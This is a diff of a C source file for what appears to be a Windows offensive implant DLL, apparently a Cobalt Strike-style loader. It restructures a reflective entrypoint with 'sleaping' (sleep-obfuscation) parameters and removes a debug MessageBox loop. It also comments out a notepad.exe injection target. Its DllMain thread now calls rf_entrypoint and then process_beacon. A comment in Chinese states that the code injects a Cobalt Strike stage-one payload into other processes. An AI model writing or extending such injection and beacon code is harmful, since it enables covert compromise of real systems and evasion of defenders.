@@ -614,10 +614,13 @@ EXTERN_DLL_EXPORT bool yolo()
 	return TRUE;
 }
 
+sleaping_para_t sleaping_para = { 0 };
+nt_functions_t nt_funcs = { 0 };
+ole32_functions_t ole32_funcs = { 0 };
+
 static status_t rf_entrypoint(HMODULE hModule)
 {
 	status_t status = 0;
-	sleaping_para_t sleaping_para = { 0 };
 
 	PSAC_DLL_HEADER sac_dll_header = NULL;
 
@@ -648,12 +651,10 @@ static status_t rf_entrypoint(HMODULE hModule)
 
 
 	// initialize functions 
-	nt_functions_t nt_funcs = { 0 };
 	if (!load_nt_functions(&nt_funcs))
 	{
 		return ST_ERROR;
 	}
-	ole32_functions_t ole32_funcs = { 0 };
 	if (!load_ole32_functions(&ole32_funcs))
 	{
 		return ST_ERROR;
@@ -665,16 +666,6 @@ static status_t rf_entrypoint(HMODULE hModule)
 	sleaping_para.view_size = sac_dll_size;
 	sleaping_para.nt = &nt_funcs;
 
-	do
-	{
-		MessageBoxA(NULL, "swappala", "swappala", MB_ICONERROR);
-		status = sleaping(&sleaping_para);
-		if (ST_FAILED(status))
-		{
-			MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
-			break;
-		}
-	} while (true);
 
 
 
@@ -690,7 +681,7 @@ static status_t rf_entrypoint(HMODULE hModule)
 	//	return FALSE;
 
 	// 向其他进程注入CS的一阶段载荷
-    WCHAR str_target[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
+    //WCHAR str_target[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
 	//WCHAR str_explorer[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
 
 	//inject(&nt_funcs, str_target);
@@ -702,12 +693,20 @@ static status_t rf_entrypoint(HMODULE hModule)
 extern status_t process_entrypoint(HMODULE hModule);
 extern status_t process_beacon(HMODULE hModule);
 
-DWORD WINAPI process_entrypoint_thread(LPVOID lpParameter)
+
+static DWORD WINAPI process_entrypoint_thread(LPVOID lpParameter)
 {
+
     HMODULE hModule = (HMODULE)lpParameter;
-    //status_t st = process_entrypoint(hModule);
-    status_t st = process_beacon(hModule);
-    return (DWORD)st; // 确保 status_t 可转换为 DWORD
+	status_t status = ST_SUCCESS;
+	status = rf_entrypoint(hModule);
+	if (ST_FAILED(status))
+		return status;
+
+
+    ////status_t st = process_entrypoint(hModule);
+    status = process_beacon(hModule);
+    return (DWORD)status; // 确保 status_t 可转换为 DWORD
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,
